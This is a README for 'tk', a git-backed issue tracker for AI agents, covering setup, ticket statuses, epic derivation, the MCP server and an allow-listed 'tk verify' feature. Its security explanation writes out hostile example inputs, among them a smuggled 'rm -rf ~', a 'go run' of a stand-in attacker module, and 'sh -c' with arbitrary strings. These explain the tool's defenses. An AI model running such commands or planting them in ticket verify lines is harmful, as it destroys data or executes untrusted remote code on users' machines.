# ticket

A git-backed issue tracker for AI agents. Rooted in the Unix Philosophy, `tk` is inspired by Joe Armstrong's [Minimal Viable Program](https://joearms.github.io/published/2014-06-25-minimal-viable-program.html) with additional quality of life features for managing and querying against complex issue dependency graphs.

Tickets are markdown files with YAML frontmatter stored in a central repository. This allows AI agents to easily search them for relevant content without dumping ten thousand character JSONL lines into their context window.

## Install

### Homebrew (macOS / Linux)

```bash
brew install EnderRealm/tools/ticket
```

To upgrade after a new release:

```bash
brew update                        # fetch latest tap metadata
brew upgrade ticket
```

### From source

Requires Go 1.25+.

```bash
git clone https://github.com/EnderRealm/ticket.git
cd ticket
go build -o ~/.local/bin/tk .
```

## Build

Local development:

```bash
go build -o tk .
```

Release builds inject the version via ldflags:

```bash
go build -ldflags "-X github.com/EnderRealm/ticket/v7/cmd.Version=7.6.1" -o tk .
```

Dev builds (`go build` with no ldflags) automatically show the git commit and dirty state via `runtime/debug.ReadBuildInfo`:

```
tk version
# dev (a1b2c3d, dirty)
```

## Getting Started

After installing, initialize from any project directory:

```bash
# First project — creates central store and registers the project
cd ~/code/myproject
tk init --central-root ~/code/forge-data/tickets
```

On a second machine, point at the same repo:

```bash
# Clone the repo that holds your tickets
git clone git@github.com:YourOrg/forge-data.git ~/code/forge-data

# Initialize and register projects
cd ~/code/myproject
tk init --central-root ~/code/forge-data/tickets
```

Subsequent projects on the same machine just need `tk init` (central root is remembered).

## Configuration

Config lives in `~/.ticket/config.yaml` (created by `tk init`):

```yaml
central_root: /Users/you/code/forge-data/tickets
git_email: tk@local
git_name: tk
default_store: central
sync_interval: 5s
verify_allow:
    - go
    - make
projects:
    myproject:
        path: /Users/you/code/myproject
```

Shared project registry (store type, auto_link, etc.) is stored in `<central_root>/config.yaml` and synced via git alongside tickets.

`verify_allow` lists the programs `tk verify` may run — see [Verifiable Acceptance Criteria](#verifiable-acceptance-criteria). It is read from this local file only; a `verify_allow` in the shared config is ignored.

`--repo` flag overrides project resolution for a single command.

### `spawn_command`

The TUI `w` keybinding (see below) launches a `/work <id>` session. The shell command it runs is configurable via the `spawn_command` template, executed with `sh -c`. Like `verify_allow`, it is read from `~/.ticket/config.yaml` only — a `spawn_command` in the shared config is ignored, and `TK_STORE_ROOT` does not relocate it — because the template *is* the code that runs as you. These placeholders are substituted:

- `{dir}` — the ticket's project working directory (absolute path)
- `{id}` — the namespaced ticket ID (e.g. `myproject/tk-...`)
- `{project}` — the project name
- `{title}` — the ticket title, sanitized like `{wtitle}` (still caller-quoted, like `{dir}`)
- `{wtitle}` — the computed window name `PROJECT -- ID4 -- TITLE` (uppercased project, the ticket's 4-char id suffix, and the title truncated to 20 characters; sanitized so it embeds without escaping)

The template runs through `sh -c`, and a ticket ID is a filename in the central store that another machine may have pushed, so both ticket-derived placeholders are constrained before they reach it. `{id}` must be letters, digits, `.`, `-` or `_`, plus at most one `/` for the project namespace, and each segment must start with a letter or digit — that covers everything `tk` generates (letters, digits and `-`, always opening with one) and the hand-named IDs already in stores (`ghostwheel/g-101.2`), while refusing `..` and an ID like `--flag` that a template would hand its program as an option rather than a ticket. Anything else refuses the spawn, naming the ID on the status line; the ticket stays usable everywhere else. Letters and digits are Unicode categories, not an ASCII range, so an ID slugged from a title in any script spawns normally. Quote `{id}` where your template interpolates it, the same as `{title}` and `{dir}`: the shape rule bounds the character set and the leading character, but quoting is what makes the placeholder safe wherever it lands.

`{title}` and `{wtitle}` are free text — an apostrophe in a title is ordinary, not an attack — so they are sanitized rather than refused: quotes, backslashes, `$`, backticks, `!`, control characters and the invisible Unicode format characters become spaces, since `$` and a backtick would otherwise expand in the interactive shell the default template types its command into, `!` would trigger its history expansion (which double quotes do not suppress, and which kills the line outright when no history event matches), and a bidi override makes a title render as something other than what runs. Sanitizing removes what would break a *quoting layer*, not everything that is shell syntax — `;`, `&`, `|` and `>` survive in a title — so a custom template must still quote `{title}` where it interpolates it, exactly as it must `{dir}`.

Watch which quotes you mean. In a `write text` payload the quotes you see are AppleScript's, not the shell's — the default's outer `"..."` is consumed by AppleScript, and what reaches the interactive shell is the escaped `\"...\"`. That is why the default's `{wtitle}` is safe inside `printf \"...\" \"{wtitle}\"` and a placeholder dropped into the visible outer quotes would not be. The default template uses only `{wtitle}`. `{dir}` and `{project}` come from project resolution rather than the shared store — your local config, or the override root's under `TK_STORE_ROOT` — and are passed through as-is (see the single-quote limitation below).

When unset, the default opens a new iTerm window (macOS), names it `{wtitle}`, cds to the project, and starts Claude Code on the ticket:

```yaml
spawn_command: 'osascript -e ''tell application "iTerm"'' -e ''set w to (create window with default profile)'' -e ''tell current session of w to set name to "{wtitle}"'' -e ''tell current session of w to write text "cd '\''{dir}'\'' && printf \"\033]0;%s\007\" \"{wtitle}\" && export CLAUDE_CODE_DISABLE_TERMINAL_TITLE=1 && claude \"/work {id}\""'' -e ''end tell'''
```

The default creates the window with a normal interactive shell, names it so each worker is identifiable, and then types the command into it (via `write text`), so the window stays open and `claude` resolves on your `PATH`. It single-quotes `{dir}` so paths with spaces work; a project path containing a literal single quote can't be escaped inside the `osascript -e` wrapper — set a custom `spawn_command` for such paths.

Making the title stick takes more than `set name`: the shell prompt (oh-my-zsh and similar set the title from a `preexec` hook) and Claude Code itself both overwrite it. So the default reasserts the title with a `printf` OSC-0 escape *after* the prompt hook fires, and `export`s `CLAUDE_CODE_DISABLE_TERMINAL_TITLE=1` so Claude Code doesn't keep rewriting the title during the session. The var is exported (not prefixed inline) because `claude` is often a shell alias — e.g. `tabset ...; command claude` — and an inline `VAR=1 claude` prefix would bind to the alias's first command rather than Claude. If you write a custom `spawn_command`, do the same if you want the title to persist.

Override to use a different terminal, e.g. tmux:

```yaml
spawn_command: 'tmux new-window -c {dir} "claude \"/work {id}\""'
```

## Agent Setup

Add this line to your `CLAUDE.md` or `AGENTS.md`:

```
This project uses a CLI ticket system for task management. Run `tk help` when you need to use it.
```

Claude Opus picks it up naturally from there. Other models may need additional guidance.

## Usage

Run `tk help` for the full command reference. Key commands:

```
Viewing:
  show <id> [--metadata]     Display ticket details
  ls|list [filters]          List tickets (default: workflow grouped)
  frontier [--project=NAME]  List ready tickets with all deps done/closed (central store)
  search <query>             Search tickets by relevance (best matches first)
  audit [--project=NAME]     Report invalid parents, and epics whose stored status is not read (central store)
  verify <id>                Run the ticket's acceptance-criteria verify commands

Creating & Editing:
  create [title] [options]   Create ticket
  edit <id> [options]        Update ticket fields
  add-note <id> [text]       Append timestamped note (stdin if no text)
  delete <id> [id...]        Delete ticket(s)

Dependencies & Links:
  dep <id> <dep-id>          Add dependency
    --cargo "<what flows>"   Name what concretely flows across the edge ("" clears)
  undep <id> <dep-id>        Remove dependency
  dep tree [--full] <id>     Show dependency tree (marks edges with no cargo)
  link <id> <id> [id...]     Link tickets (symmetric)
  unlink <id> <target-id>    Remove link

Query:
  query [jq-filter]          Output tickets as JSONL (pipe to jq)

Setup:
  init [--project <name>] [--central-root <path>] [--yes]
                               Initialize tk and register a project
  sync                         Sync ticket changes to git
  status                       Show tk system status

Interactive:
  ui                         Terminal UI
  serve                      MCP server for AI agent integration

Journal:
  watch start [--interval=5s]  Start background git commit watcher
  watch stop                   Stop the background watcher
  watch status                 Show watcher status
  watch logs [-n 50]           Show watcher log output
  recompute [--project=NAME]   Rebuild commit journal from git history
```

### TUI Keybindings

The `tk ui` browser supports the usual navigation keys plus, in both the list and detail views:

| Key | Action |
|-----|--------|
| `y` | Yank (copy) the ticket ID to the clipboard |
| `w` | Spawn a `/work <id>` session in a new terminal (see `spawn_command`) |

In the list view, tab-specific status keys:

| Key | Action |
|-----|--------|
| `r` | Backlog tab: move ticket to ready |
| `b` | Inbox tab: move ticket to backlog |
| `x` | Inbox tab: mark ticket done |

### Statuses

Tickets use a simple status model:

| Status | Meaning |
|--------|---------|
| backlog | Waiting for grooming |
| ready | Available to work |
| open | Currently being worked on |
| done | Completed |
| closed | Not an issue, duplicate, etc. |

### Types

| Type | Purpose |
|------|---------|
| epic | Container for related features |
| feature | New functionality |
| bug | Defect fix |

The hierarchy is one level deep: a ticket's `parent` must name an epic in the same project, and an epic itself has no parent. `tk audit` reports tickets that break the rule.

### Epic Status

An epic's status is not set, it is computed from its children:

| Children | Epic reads |
|----------|------------|
| `abandoned: true` and all children done or closed | closed |
| none | backlog |
| any child open | open |
| all done | done |
| all done or closed, at least one closed | closed |
| anything else | backlog |

`done` and `closed` say different things about a finished epic: `done` means the work completed, `closed` means it did not. An epic whose children were every one abandoned, or moved to another repo, reads `closed`.

An epic never reads `ready` — `ready` means "available to pick up" and an epic is not picked up directly. Setting an epic's status by hand is refused; change its children instead.

An epic's completion date is derived alongside its status: it is the date its last child reached a terminal state, and it is blank while the epic is not terminal. Nothing writes an epic when a child of it finishes, so `tk show`, `tk query` and the TUI's COMPLETED and DURATION columns read the children rather than a date on the epic's own file — an epic's file stores no completion date at all.

The one exception is abandoning an epic: `tk edit <epic> --status closed` records `abandoned: true` on the epic and closes every non-terminal child in the same action (children that already finished keep their `done`). The abandoned epic reads `closed` only while every child is terminal, so reopening one un-closes the epic until it finishes again. Setting any other status takes the abandon back, whatever the epic reads at the time. The children the abandon closed are reported with the edit — named on `tk edit`'s and the TUI's own line, returned by MCP `ticket_edit` as `closed_children` — so a write that mutated other tickets says so.

Changing a ticket's type to `epic` is judged the same way: `tk edit <id> --type epic` on its own is one ordinary edit and the status it carries back is not read as a decision, while a status set in the same call is a status set on the epic that edit makes — `closed` abandons it, anything else is refused.

Only a status a writer actually set counts as either decision: `tk edit --status`, the `status` argument to MCP `ticket_edit`, or the TUI edit form's status field cycled off the value it was opened with. A status that merely rode along with an edit to some other field is not a decision and is never judged as one — it can neither record an abandon nor be refused for disagreeing with the children. Writes tk makes on its own behalf express no intent either: `tk move` closes an epic in the source repo to record that it left, and the children staying behind are untouched, and a commit carrying `Closes: [<epic-id>]` closes nothing — the commit watcher skips epics with a warning, since an epic is closed by its children.

The intent lives in its own field because `status` on an epic is what every reader is shown and therefore what every edit carries back: an edit to a title or a note round-trips the flag unchanged, where it would otherwise drop or invent one. An epic's `status:` field is advisory — the derivation never reads it — so a value left there by an unrelated write means nothing.

Epics written before statuses were derived keep whatever `status` their file holds, and it is ignored: an epic closed by hand back then reads as its children imply until it is closed again. Nothing was migrated and no file was rewritten, so `tk audit` reports every epic that now reads a different status than its file stores. An epic whose file stores `closed` with no `abandoned` flag is listed separately as `stored-closed`: that is either a hand-close from before the change or a derived `closed` that some write carried into the file, and nothing in the file tells the two apart. Re-record the ones that should stay abandoned with `tk edit <id> --status closed` — and do it before editing those epics, because the stored value is the only surviving trace of the decision and the next write of the epic replaces it with the derived one.

Neither class is confined to the migration, so the report does not empty out: every write of an epic stores the status it derived at that moment, which the next change to a child makes stale, and an epic that derived `closed` at the time of a write comes back as `stored-closed`. A stored value is evidence of a decision only on a file older than derived statuses; on a newer one it is an artifact, and closing the epic to "re-record" it would close a child nobody asked to close.

### Verifiable Acceptance Criteria

Acceptance criteria live in the ticket's `## Acceptance Criteria` section as bullets. A criterion can declare the command that checks it on a following line indented by at least two spaces:

```markdown
## Acceptance Criteria

- Frontier excludes blocked tickets.
  verify: go test ./pkg/ticket -run TestFrontier
- Docs updated.
```

`tk verify <id>` runs each declared command in the ticket's project directory (from the project's configured `path`, falling back to the working directory), sequentially, with a 120s timeout per command — a command that overruns is a failure. Criteria with no `verify:` line are reported as `unverified`, not failed.

```bash
tk verify 5c4
# verifying nw-5c46 in /Users/you/code/myproject
# PASS (exit 0) Frontier excludes blocked tickets.
# UNVERIFIED Docs updated.
# 1 pass, 0 fail, 0 refused, 1 unverified
```

The command exits non-zero if any criterion failed or was refused, and records the run in the ticket's `## Test Results` section (replacing the previous record):

```
verify 2026-07-31T22:10:00Z: 1 pass, 0 fail, 0 refused, 1 unverified
- PASS (exit 0): Frontier excludes blocked tickets.
- UNVERIFIED: Docs updated.
```

`tk verify --json` and the `ticket_verify` MCP tool return the same results structured, including each command's exit code and captured output (capped at 4KB per criterion). The MCP tool executes the commands on the server host and requires the ticket's project to have a configured path.

#### What may run

A verify command is content: agents write ticket bodies, and bodies replicate to every machine over the shared store's git remote. Two rules keep that content from becoming code execution.

**No shell.** The command is split into arguments on whitespace — single and double quotes group an argument, so `-run 'TestA|TestB'` survives whole — and then exec'd directly. Nothing is expanded and nothing is interpreted: `;`, `|`, `&&`, `$(...)`, backticks, `*` and `~` are literal characters handed to the program as part of an argument. `go test ./...; rm -rf ~` runs `go` with the arguments `test`, `./...;`, `rm`, `-rf`, `~` — `go` rejects the nonsense arguments, and nothing is deleted.

**Allow-list.** The program — the first word — must exactly match an entry in `verify_allow` in your machine-local `~/.ticket/config.yaml`. Matching is exact string equality, not by basename, so an entry of `go` does not admit `/tmp/evil/go`. Anything else is `refused`: it never runs, and the refusal names the command and how to permit it.

An entry names a lookup, not a fixed file: a bare `go` resolves through tk's `PATH` when the command is exec'd, and a relative entry such as `./scripts/check.sh` resolves against the project directory the command runs in — the same working tree your agents write to. Use an absolute path to pin a specific binary.

```yaml
# ~/.ticket/config.yaml
verify_allow:
  - go
  - make
  - ./scripts/check.sh
```

Unset, the list defaults to `go`, `make`, `cargo`, `pytest`. An explicitly empty `verify_allow: []` refuses everything, and so does a `~/.ticket/config.yaml` that cannot be parsed — a half-written or conflicted config never restores the defaults over a list you had narrowed.

**What listing a program actually grants.** An entry is not a claim that the program is safe. It trusts whoever can write a verify line with everything that program can do, including the forms that run code from outside your repo:

- `go run example.com/attacker/x@latest` and `go install pkg@version` fetch and execute a remote module, ignoring the checked-out repo entirely.
- `cargo install <crate>` fetches a remote crate and executes its `build.rs` at build time — the direct analogue of `go install`.
- `make -f /path/to/anything` and `make -C <dir>` run recipes from a file the command line names rather than the repo's Makefile.

They are in the default, because `go test` is the point of the feature and cannot be dropped over them. What the default buys you is that a verify line cannot name an arbitrary program — not that the listed ones are confined to the repo. Shells and interpreters are left out because they remove even that while buying nothing back: `sh -c '<anything>'` or `python3 -c '<anything>'` runs whatever string the ticket supplied.

`swift` is left out on that rule, not as a build driver: `swift -e '<code>'` runs arbitrary Swift with the full standard library, the same unconditional reach that keeps `sh` and `python3` out — and unlike `go run pkg@version` it needs no remote module and no network. A Swift project gets `swift test` back by adding `swift` to `verify_allow`, accepting that a verify line can then run any Swift the ticket names.

`npm`, `pnpm` and `yarn` are left out for the same reason — `npm exec <pkg>`, `pnpm dlx` and `yarn dlx` fetch and run an arbitrary package off the registry as a documented feature. A JS project that adds one back is opting into a verify line being able to run any published package, which may well be an acceptable trade in a repo whose `npm test` already runs whatever `package.json` says. Add it deliberately, not by default.

The list is read from `~/.ticket/config.yaml` alone. `verify_allow` in the shared `<central_root>/config.yaml` is ignored, because that file syncs over the same remote that would carry a hostile command — one push would otherwise plant the command and widen the list that should refuse it. There is no flag, no MCP argument and no ticket field that grants permission: **an agent can run what you have already allowed, and can authorize nothing further.** Only you, editing your own machine's config file, widen the list.

A refusal is reported as `refused`, never as a failure, and counted separately in the summary and the recorded results — a criterion that never ran is not a criterion that disagreed. Control characters — C0/C1, DEL and the Unicode format characters, including the bidi overrides — are stripped from both the criterion text and the command before they are printed or recorded, so an escape planted anywhere in a ticket's acceptance criteria cannot repaint the terminal you are reading the verdict on, nor replay on every later `tk show`. Tabs survive, being ordinary in a markdown bullet and harmless on a terminal. The stripping covers the criterion text and its command, and not a command's own output: that is printed as the program emitted it, so coloured test output stays readable.

### Filter Flags

```
--status X        Filter by status (backlog, ready, open, done, closed)
-t, --type X      bug | feature | epic
-P, --priority X  0 (critical) through 4 (backlog)
-T, --tag X       Filter by tag
--field key=val   Filter by extra field (substring match)
--parent X        Children of ticket X
--group-by X      Group by: workflow | type | priority
--flat            Flat list (no grouping)
```

### Extra Fields

Tickets support arbitrary custom key/value metadata via `--set`:

```bash
tk create "Deploy config" --set env=production --set region=us-east
tk edit <id> --set env=staging        # update
tk edit <id> --set env=               # remove
```

Extra fields appear in `tk show` output, `tk query` JSONL (under `extra`), and MCP responses.

Filter the list by an extra field with substring matching:

```bash
tk ls --field env=prod        # matches env=production
```

### Outputs

A ticket records what it produced in an `outputs` frontmatter block — the handoff for downstream tickets:

```yaml
outputs:
  branch: add-outputs-1234
  commit: 31fc605
  artifact: dist/tk
```

Keys are freeform (letters, digits, hyphens, underscores); `branch` and `commit` are the well-known ones. Values are written as plain unquoted YAML scalars, so YAML indicator characters and surrounding whitespace are rejected. Set them with `--output` on `tk edit`, or the `outputs` argument on the `ticket_edit` MCP tool:

```bash
tk edit <id> --output artifact=dist/tk --output commit=31fc605
tk edit <id> --output artifact=            # remove
```

Outputs are populated automatically when a ticket lands: the commit watcher records the closing commit's SHA and branch on auto-close, and marking a ticket `done` from anywhere (CLI, MCP, or TUI) copies its `branch` field. Existing values are never overwritten, so anything set by hand wins; a derived value that would not serialize cleanly is dropped rather than written.

`tk show` renders them as an `## Outputs` section, and they appear under `outputs` in `tk query` JSONL and MCP responses.

### Bulk Operations

Move all ready tickets to backlog:

```bash
tk query '.status == "ready"' | jq -r '.id' | xargs -I{} tk edit {} --status backlog
```

Partial ID matching: `tk show 5c4` matches `nw-5c46`.

### Git Sync

`tk serve` automatically commits and pushes ticket changes every 5 seconds. For manual sync:

```bash
tk sync
```

If a push conflict occurs, tk attempts `pull --rebase`. If rebase fails, sync is blocked and a `.tk-sync-blocked` marker is written. Resolve the conflict manually, then sync resumes on the next cycle.

### Multi-Project Serving

`tk serve` starts the MCP server with a `MultiStore` that serves all projects from the central ticket store. Ticket IDs are namespaced as `project/ticket-id`.

**Default project scoping:**
- When run from inside a project repo, tools default to that project's tickets
- When run outside any repo, tools return tickets from all projects
- The `project` parameter on `ticket_list`, `ticket_create`, `ticket_ready`, and `ticket_inbox` overrides the default

Other tools (`ticket_show`, `ticket_edit`, etc.) accept namespaced IDs directly — pass `forge/my-ticket-1234` to operate on a specific project's ticket.

### Isolated stores (`TK_STORE_ROOT`)

Set `TK_STORE_ROOT` to an absolute path and tk resolves its whole store against that root instead of the configured `central_root` — for a test harness driving `tk serve`, or anything else that must not write to the real store:

```bash
TK_STORE_ROOT=/tmp/tk-sandbox tk serve
```

With the override set:

- The store is `<root>/tickets/<project>/`, the shared config `<root>/config.yaml`, and the local config `<root>/.ticket/config.yaml`. Neither the configured store tree nor `~/.ticket/config.yaml` is read or written.
- `tk serve` starts without a `~/.ticket/config.yaml` at all — the override is the configuration.
- No sync and no journal watch run, so nothing is committed or pushed and no ticket is auto-closed. `tk serve` starts neither loop (and logs that it did not), and `tk sync`, `tk watch` and `tk recompute` refuse to run at all: sync would commit and push whatever git repo encloses the sandbox, and the commit journal stays under `$HOME`, which the override does not move — so watch would auto-close sandbox tickets while journalling into the real home, and recompute would delete and rebuild your journal for any project name the sandbox happens to register. Journal state is the one *store* path `$HOME` still decides; every other store path the override resolves for itself.
- `tk init` still registers a project — a harness needs it to, since central writes to an unregistered project are refused — but it skips the store's git bootstrap. A throwaway store keeps no history, and bootstrapping one nested inside another repo would stage and commit that repo's worktree.
- `verify_allow` and `spawn_command` are the settings the override does not move: both are read from `~/.ticket/config.yaml` always. The override root belongs to whoever set the variable, and each of these decides code that runs as you — so following it there would let a sandbox widen the allow-list (`verify_allow: [sh]`) or hand the TUI its own `sh -c` template, and a sandbox with no config would restore the defaults over an allow-list you had narrowed. Pinning them to `$HOME` bounds what a *store root* can supply, not a caller who also controls the environment: whoever can set `TK_STORE_ROOT` can generally set `HOME` too.
- A value that is not an absolute path is an error, on any command, before any store is resolved. There is no fall-back to the configured store — a silent fall-back is the failure this exists to prevent. The empty string is such a value: `TK_STORE_ROOT=` is a store root tk cannot resolve, not an unset variable.

The guarantee covers tk's own store resolution and nothing wider. Two things are outside it, by design and under separate controls:

- **`ticket_create`'s `repo` argument.** It resolves a caller-supplied absolute path before any config lookup, so its write target sits outside the override by construction.
- **Commands a ticket's `verify` lines run.** `verify_allow` defaults include `go` and `make`, and `go run pkg@version` or `make -f <file>` run code from outside the repo — code that can reach any path. The allow-list is pinned to `~/.ticket/config.yaml`, but the *directory* a verify command runs in is not: it comes from the project `path` in whichever config wins, so under the override the sandbox root names it — `make` there runs that directory's Makefile. See [What may run](#what-may-run).

## Development

### Testing the MCP server locally

`.mcp.json` includes a dev server entry (disabled by default) pointing to the locally built `./tk` binary:

- **`tk-dev`** — multi-project mode (`./tk serve`)

To test MCP changes:

1. Build the binary:
   ```bash
   go build -o tk .
   ```

2. In Claude Code, open `/mcp` and:
   - Disable the global `plugin:forge:tk` server
   - Enable `tk-dev`

3. When done, swap back: disable the dev server, re-enable `plugin:forge:tk`.

## Releasing

The git tag is the single source of truth for the version. There is no version constant in source: `cmd/root.go` declares `Version = "dev"`, and GoReleaser injects the tag's value via ldflags at build time. **Tagging is what releases** — pushing a `v*` tag triggers the build.

Pick the new version from the `[Unreleased]` changelog entries against the latest tag: new `Added`/`Changed` items → minor bump (`7.5.1` → `7.6.0`); `Fixed`-only → patch bump (`7.5.0` → `7.5.1`).

1. Run the tests — must be green:

   ```bash
   go test ./...
   ```

2. Update `CHANGELOG.md` — rename the `[Unreleased]` heading to a versioned heading with today's date:

   ```markdown
   ## [7.6.0] - 2026-06-08
   ```

3. Commit, then tag and push (commit and tag are pushed separately):

   ```bash
   git commit -am "release: v7.6.0"
   git tag v7.6.0
   git push
   git push origin v7.6.0
   ```

4. The `v*` tag push triggers GitHub Actions (`release --clean`); plain `master` pushes run CI only:
   - **GoReleaser** builds darwin/linux binaries (amd64 + arm64) and publishes a GitHub release with archives + checksums
   - **Homebrew** tap updated in `EnderRealm/homebrew-tools`

Required repository secrets: `GITHUB_TOKEN`, `TAP_GITHUB_TOKEN`.

### Monitoring & Debugging Releases

```bash
# Watch the release workflow
gh run list --limit 1
gh run watch <run-id> --exit-status

# If it fails, check logs
gh run view --log-failed

# If assets were partially uploaded (rerun fails with "already_exists"),
# delete the draft release and retry
gh release delete v2.1.0 --yes
gh run rerun --failed
```

`TAP_GITHUB_TOKEN` is a fine-grained PAT with Contents (read & write) permission on `EnderRealm/homebrew-tools`. If it expires, the Homebrew step will fail with a 401. Regenerate and update:

```bash
gh secret set TAP_GITHUB_TOKEN
```

## License

MIT
